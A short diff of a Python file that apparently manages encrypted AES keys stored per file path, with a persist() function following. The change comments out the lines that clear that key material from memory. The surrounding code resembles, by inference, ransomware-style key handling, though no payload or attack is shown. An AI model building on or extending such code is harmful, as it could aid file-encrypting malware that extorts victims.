@@ -87,9 +87,9 @@ def menu():
 
                 f.write(base64.b64encode(encrypted_aes_key) + " " + _[1] + "\n")
 
-        aes_keys_and_base64_path = None
-        del aes_keys_and_base64_path
-        gc.collect()
+        # aes_keys_and_base64_path = None
+        # del aes_keys_and_base64_path
+        # gc.collect()
 
 
 def persist():
